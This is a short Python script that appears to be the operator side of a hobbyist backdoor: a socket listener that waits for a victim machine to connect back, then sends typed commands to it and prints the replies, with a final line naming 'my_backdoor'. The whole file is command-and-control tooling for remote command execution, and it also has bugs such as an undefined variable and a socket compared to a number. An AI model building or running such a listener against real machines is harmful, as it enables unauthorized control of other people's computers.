
import socket


class Listener:
    def __init__(self, ip, port):
        try:
            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            listener.bind(((ip, port)))
            listener.listen(0)
            print("[+] Waiting for incoming connections")
            self.connection, address = listener.accept()
            print("[+] Got a connection from" + str(address))
        except KeyboardInterrupt:
            print("[+] Detected CTRL + C.....Closing App....Please wait...")
            if self.connection > 2:
                self.connection.close()
            exit()

    def receive_response(self):
        msg = self.connection.recv(1024)
        print(str(msg))

    def close_connection(self):
        self.connection.close()

    def execute_remote_command(self, command):
        self.connection.send(command.encode())
        return self.connection.recv(1024)

    def run(self):
        while True:
            try:
                command = input(">> ")
                result = self.execute_remote_command(command)
                print(result)

            except KeyboardInterrupt:
                print("[+] Detected CTRL + C.....Closing App....Please wait...")
                self.connection.close()
                exit()

# class end

my_listener = Listener("127.0.0.1", 4462)
my_listener.run()
my_backdoor.close_connection()
    